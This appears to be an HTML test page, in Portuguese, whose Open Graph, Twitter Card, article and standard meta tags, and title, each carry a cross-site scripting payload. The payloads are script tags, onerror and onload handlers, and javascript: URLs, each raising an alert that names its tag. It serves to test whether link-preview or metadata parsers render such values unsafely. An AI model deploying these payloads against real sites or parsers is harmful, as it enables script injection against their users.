<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  
  <!-- Open Graph -->
  <meta property="og:title" content="<img src=x onerror='alert(&quot;XSS: og:title&quot;)'>">
  <meta property="og:description" content="<script>alert('XSS: og:description')</script>">
  <meta property="og:image" content="data:image/svg+xml,<svg onload='alert(&apos;XSS: og:image&apos;)' xmlns='http://www.w3.org/2000/svg'></svg>">
  <meta property="og:url" content="javascript:alert('XSS: og:url')">
  <meta property="og:site_name" content="<img src=x onerror='alert(&quot;XSS: og:site_name&quot;)'>">
  <meta property="og:type" content="<script>alert('XSS: og:type')</script>">
  <meta property="og:video" content="javascript:alert('XSS: og:video')">
  <meta property="og:audio" content="javascript:alert('XSS: og:audio')">
  
  <!-- Twitter Card -->
  <meta name="twitter:card" content="<script>alert('XSS: twitter:card')</script>">
  <meta name="twitter:title" content="<img src=x onerror='alert(&quot;XSS: twitter:title&quot;)'>">
  <meta name="twitter:description" content="<script>alert('XSS: twitter:description')</script>">
  <meta name="twitter:image" content="data:image/svg+xml,<svg onload='alert(&apos;XSS: twitter:image&apos;)'></svg>">
  <meta name="twitter:site" content="<script>alert('XSS: twitter:site')</script>">
  <meta name="twitter:creator" content="<img src=x onerror='alert(&quot;XSS: twitter:creator&quot;)'>">
  
  <!-- Outras Meta Tags -->
  <meta name="description" content="<script>alert('XSS: description')</script>">
  <meta name="keywords" content="<img src=x onerror='alert(&quot;XSS: keywords&quot;)'>">
  <meta name="author" content="<script>alert('XSS: author')</script>">
  <meta name="robots" content="<script>alert('XSS: robots')</script>">
  
  <!-- Article (para blogs) -->
  <meta property="article:author" content="<script>alert('XSS: article:author')</script>">
  <meta property="article:published_time" content="<script>alert('XSS: article:published_time')</script>">
  <meta property="article:tag" content="<img src=x onerror='alert(&quot;XSS: article:tag&quot;)'>">
  
  <title><script>alert('XSS: title')</script>Site Teste</title>
</head>
<body>
  <h1>ðŸ”´ Site com XSS em Todas as Meta Tags</h1>
  <p>Cada meta tag tem um alert diferente para vocÃª identificar qual foi explorada!</p>
</body>
</html>
